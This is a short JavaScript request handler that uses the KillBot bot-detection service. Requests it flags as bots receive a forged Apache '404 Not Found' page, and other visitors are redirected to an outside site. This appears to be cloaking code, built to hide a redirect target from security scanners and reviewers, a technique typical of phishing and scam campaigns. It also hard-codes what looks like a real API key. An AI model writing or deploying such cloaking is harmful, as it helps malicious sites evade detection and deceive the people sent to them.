import KillBot from 'killbot.to';

const apiKey = '225e7b97-524c-45d6-800c-aa7e3831a1ab';
const config = 'default';
const killBot = new KillBot(apiKey, config);

export default async function handler(req, res) {
  try {
    // En dev local, on force une IP publique bidon (ex. 8.8.8.8)

    const result = await killBot.checkReq(req);

    if (result.block) {
      const fake404 = `
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
        <html><head>
        <title>404 Not Found</title>
        </head><body>
        <h1>Not Found</h1>
        <p>The requested URL $requestedPageWithoutQueryString was not found on this server.</p>
        <hr>
        <address>Apache/2.4.57 (Debian) Server at $serverName Port 80</address>
        </body></html>`;
      return res.status(404).send(fake404);
    } else {
      res.writeHead(302, { Location: 'https://maurpie.com' });
      return res.end();
    }
  } catch (err) {
    console.error('KillBot error:', err);
    return res.status(500).send('Internal Server Error');
  }
}